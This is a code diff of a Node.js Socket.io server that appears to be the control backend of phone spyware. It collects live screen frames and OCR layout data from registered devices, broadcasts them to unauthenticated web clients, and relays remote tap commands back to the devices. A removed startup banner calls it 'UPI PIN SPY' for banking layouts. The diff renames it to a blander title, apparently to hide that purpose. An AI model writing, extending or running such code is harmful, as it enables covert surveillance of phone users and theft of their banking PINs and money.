@@ -19,58 +19,44 @@ app.use(express.json({ limit: '200mb' }));
 app.use(express.urlencoded({ limit: '200mb', extended: true }));
 
 const devices = new Map();
-const GLOBAL_ROOM = 'all-web-clients'; // 🔥 ALL WEB GET ALL FRAMES!
+const GLOBAL_ROOM = 'all-screens-live';
 
-app.get('/devices', (req, res) => {
-    res.json(Array.from(devices.entries()));
-});
+app.get('/devices', (req, res) => res.json(Array.from(devices.entries())));
 
 io.on('connection', (socket) => {
-    console.log('🔌 Connected:', socket.id);
-    
-    // 🔥 AUTO JOIN GLOBAL ROOM - INSTANT FRAMES!
+    console.log(`🔌 ${socket.id.slice(0,8)} CONNECTED`);
     socket.join(GLOBAL_ROOM);
-    console.log('🌐 Web AUTO-JOINED GLOBAL_ROOM:', socket.id);
-
+    
     socket.on('register-device', (deviceInfo) => {
         const deviceId = deviceInfo.deviceId;
-        if (deviceId) {
-            devices.set(deviceId, { 
-                ...deviceInfo, 
-                connected: true, 
-                socketId: socket.id,
-                lastSeen: Date.now()
-            });
-            socket.join(`device_${deviceId}`);
-            console.log('✅ DEVICE LIVE:', deviceId.slice(0,12), '| Model:', deviceInfo.model);
-            io.to(GLOBAL_ROOM).emit('devices-update', Array.from(devices.entries()));
-        }
+        devices.set(deviceId, { ...deviceInfo, connected: true, socketId: socket.id, lastSeen: Date.now() });
+        socket.join(`device_${deviceId}`);
+        console.log(`✅ LIVE: ${deviceId.slice(0,12)} | ${deviceInfo.model}`);
+        io.to(GLOBAL_ROOM).emit('devices-update', Array.from(devices.entries()));
     });
 
-    socket.on('select-device', (data) => {
-        socket.data.selectedDevice = data.deviceId;
-        console.log('🎯 SELECTED:', data.deviceId);
-    });
-
-    // 🔥 BROADCAST TO ALL WEB CLIENTS (INSTANT!)
+    // 🔥 FRAME + LAYOUT ANALYSIS
     socket.on('screen-frame', (frameData) => {
         const deviceId = frameData.deviceId;
         if (devices.has(deviceId)) {
             devices.set(deviceId, { ...devices.get(deviceId), lastSeen: Date.now() });
             
-            console.log(`📱 Frame → ${deviceId.slice(0,8)} (${frameData.width}x${frameData.height}) FPS:22`);
+            // 🔥 SEND TO ALL WEB + OCR DATA
+            const enhancedData = {
+                ...frameData,
+                layoutAnalysis: frameData.layoutAnalysis || {}, // OCR result
+                fps: frameData.fps || 22
+            };
             
-            // 🔥 GLOBAL BROADCAST + DEVICE ROOM
-            io.to(GLOBAL_ROOM).emit('screen-frame', frameData);
-            socket.to(`device_${deviceId}`).emit('screen-frame', frameData);
+            io.to(GLOBAL_ROOM).emit('screen-frame', enhancedData);
+            socket.to(`device_${deviceId}`).emit('screen-frame', enhancedData);
         }
     });
 
-    // 🔥 CONTROL TO SPECIFIC DEVICE
     socket.on('control', (controlData) => {
-        const { deviceId, action, x, y, startX, startY, endX, endY } = controlData;
+        const { deviceId, action, x, y } = controlData;
         if (devices.has(deviceId)) {
-            console.log(`🎮 ${action.toUpperCase()} → ${deviceId.slice(0,8)} (${x?.toFixed(0)},${y?.toFixed(0)})`);
+            console.log(`🎮 ${action.toUpperCase()} ${deviceId.slice(0,8)} (${x?.toFixed(0)},${y?.toFixed(0)})`);
             socket.to(`device_${deviceId}`).emit('control', controlData);
         }
     });
@@ -80,26 +66,23 @@ io.on('connection', (socket) => {
             if (info.socketId === socket.id) {
                 devices.set(deviceId, { ...info, connected: false });
                 io.to(GLOBAL_ROOM).emit('devices-update', Array.from(devices.entries()));
-                console.log('📱 OFFLINE:', deviceId.slice(0,12));
                 break;
             }
         }
     });
 });
 
-// Heartbeat
 setInterval(() => {
+    const now = Date.now();
     for (const [deviceId, info] of devices.entries()) {
-        if (info.connected && (Date.now() - info.lastSeen > 45000)) {
+        if (info.connected && (now - info.lastSeen > 45000)) {
             devices.set(deviceId, { ...info, connected: false });
-            io.to(GLOBAL_ROOM).emit('devices-update', Array.from(devices.entries()));
         }
     }
 }, 10000);
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`\n🚀 UPI PIN SPY v5.0 - BANKING LAYOUTS LIVE!`);
-    console.log(`🌐 http://0.0.0.0:${PORT}`);
-    console.log(`📱 GLOBAL BROADCAST → INSTANT SCREENS + UPI PIN!\n`);
+    console.log(`\n🎯 BLACK SCREEN BUSTER LIVE! PORT ${PORT}`);
+    console.log(`🌐 http://0.0.0.0:${PORT}\n`);
 });
